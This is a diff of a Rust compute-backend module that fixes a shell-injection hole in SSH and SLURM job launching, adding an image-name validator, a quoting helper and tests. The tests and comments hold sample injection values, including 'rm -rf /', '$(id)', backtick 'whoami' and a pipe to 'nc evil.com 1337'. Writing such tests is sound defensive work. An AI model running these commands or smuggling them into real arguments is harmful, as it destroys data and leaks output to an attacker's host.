@@ -83,13 +83,32 @@ impl ComputeBackend for ByocBackend {
                 let job_id = Uuid::new_v4();
                 let inputs_json = serde_json::to_string(&plan.inputs)?;
 
-                // SSH to host → docker run with inputs piped via env var
+                // Validate image as a Docker reference — alphanumeric +
+                // a small set of separators. Without this, an LLM-
+                // generated tool call (or any caller passing untrusted
+                // text) could pass `ubuntu; rm -rf /; #` and the
+                // remote shell would execute it. See Bug #54.
+                if !is_valid_docker_image(&plan.image) {
+                    bail!(
+                        "invalid docker image reference {:?}: must match \
+                         [A-Za-z0-9._/:@-]+",
+                        plan.image
+                    );
+                }
+
+                // SSH to host → docker run with inputs piped via env var.
+                // Single-quote-escape all interpolated values so JSON
+                // payloads / image names containing apostrophes can't
+                // break out of the quoted string and inject shell
+                // commands. The shell-quote sequence `'\''` closes the
+                // quote, escapes a literal apostrophe, and reopens.
                 let docker_cmd = format!(
                     "docker run -d --name prism-job-{job_id} \
                      -e PRISM_JOB_ID={job_id} \
-                     -e PRISM_INPUTS='{inputs_json}' \
-                     {image}",
-                    image = plan.image,
+                     -e PRISM_INPUTS={inputs_q} \
+                     {image_q}",
+                    inputs_q = sh_single_quote(&inputs_json),
+                    image_q = sh_single_quote(&plan.image),
                 );
 
                 tracing::info!(
@@ -158,16 +177,32 @@ impl ComputeBackend for ByocBackend {
                 let job_id = Uuid::new_v4();
                 let inputs_json = serde_json::to_string(&plan.inputs)?;
 
-                // SSH to SLURM head node → sbatch a singularity/docker job
+                // Same image validation as the SSH path. The SLURM script
+                // executes `singularity exec docker://{image}` on the head
+                // node — without validation an LLM-controlled image
+                // string would land in the SBATCH script and run on
+                // the cluster. See Bug #54.
+                if !is_valid_docker_image(&plan.image) {
+                    bail!(
+                        "invalid docker image reference {:?}: must match \
+                         [A-Za-z0-9._/:@-]+",
+                        plan.image
+                    );
+                }
+
+                // SSH to SLURM head node → sbatch a singularity/docker job.
+                // PRISM_INPUTS uses the same single-quote-escape helper
+                // as the SSH path so JSON apostrophes can't break out.
                 let sbatch_script = format!(
                     "#!/bin/bash\n\
                      #SBATCH --job-name=prism-{job_id}\n\
                      #SBATCH --partition={partition}\n\
                      #SBATCH --output=/tmp/prism-{job_id}.out\n\
                      export PRISM_JOB_ID={job_id}\n\
-                     export PRISM_INPUTS='{inputs_json}'\n\
+                     export PRISM_INPUTS={inputs_q}\n\
                      singularity exec docker://{image} /entrypoint.sh\n",
                     image = plan.image,
+                    inputs_q = sh_single_quote(&inputs_json),
                 );
 
                 let ssh_cmd = format!("echo '{}' | sbatch", sbatch_script.replace('\'', "'\\''"));
@@ -368,6 +403,40 @@ impl ComputeBackend for ByocBackend {
     }
 }
 
+// ── Shell-injection helpers (Bug #54) ───────────────────────────────────
+
+/// Wrap a value in POSIX single quotes, escaping any internal `'` as
+/// `'\''` (close-quote, escaped-apostrophe, reopen-quote). The result
+/// is safe to embed in any single-shell-pipeline `bash -c` argument.
+///
+/// Used by the BYOC SSH path where we have to send a `docker run …`
+/// command line through ssh's remote shell. Without this wrapping a
+/// JSON payload containing a `'` would break out of the quoting and
+/// let the rest be interpreted as a separate shell command.
+fn sh_single_quote(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() + 2);
+    out.push('\'');
+    for c in s.chars() {
+        if c == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(c);
+        }
+    }
+    out.push('\'');
+    out
+}
+
+/// Validate a Docker image reference. Permissive enough to accept all
+/// real-world tags (digests, registries, ports, namespaces) but
+/// strict enough to reject obvious shell-injection attempts.
+fn is_valid_docker_image(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 256
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | ':' | '-' | '@'))
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -427,5 +496,60 @@ mod tests {
         } else {
             panic!("expected Ssh");
         }
+    }
+
+    #[test]
+    fn sh_single_quote_wraps_plain_string() {
+        assert_eq!(sh_single_quote("hello"), "'hello'");
+    }
+
+    #[test]
+    fn sh_single_quote_escapes_apostrophe() {
+        // The classic injection — a stray apostrophe must be replaced
+        // with the close-escape-reopen sequence so the payload stays
+        // contained inside the quoted string.
+        assert_eq!(sh_single_quote("don't"), r"'don'\''t'");
+    }
+
+    #[test]
+    fn sh_single_quote_handles_injection_payload() {
+        // Realistic injection: JSON-ish input that ends with `'); rm -rf /; #`
+        // would close the wrapping quote and execute the rest. Verify
+        // the escape neutralises it.
+        let payload = "{\"k\":\"v\"}'); rm -rf /; #";
+        let q = sh_single_quote(payload);
+        // The result must start and end with `'` and contain no
+        // unescaped apostrophe in between.
+        assert!(q.starts_with('\''));
+        assert!(q.ends_with('\''));
+        // Apostrophes are present only as the escape sequence.
+        let inner = &q[1..q.len() - 1];
+        // Every literal ' becomes '\''  → split on '\'' produces N+1 pieces
+        // none of which contain a bare '.
+        for piece in inner.split(r"'\''") {
+            assert!(!piece.contains('\''), "unescaped quote in {piece}");
+        }
+    }
+
+    #[test]
+    fn is_valid_docker_image_accepts_real_refs() {
+        assert!(is_valid_docker_image("ubuntu"));
+        assert!(is_valid_docker_image("ubuntu:22.04"));
+        assert!(is_valid_docker_image("ghcr.io/user/repo:latest"));
+        assert!(is_valid_docker_image(
+            "gcr.io/proj/img@sha256:abcdef0123456789"
+        ));
+        assert!(is_valid_docker_image("registry.local:5000/img:v1"));
+    }
+
+    #[test]
+    fn is_valid_docker_image_rejects_injection_attempts() {
+        assert!(!is_valid_docker_image(""));
+        assert!(!is_valid_docker_image("ubuntu; rm -rf /"));
+        assert!(!is_valid_docker_image("ubuntu\nfoo"));
+        assert!(!is_valid_docker_image("ubuntu`whoami`"));
+        assert!(!is_valid_docker_image("ubuntu$(id)"));
+        assert!(!is_valid_docker_image("ubuntu | nc evil.com 1337"));
+        assert!(!is_valid_docker_image(&"a".repeat(257)));
     }
 }
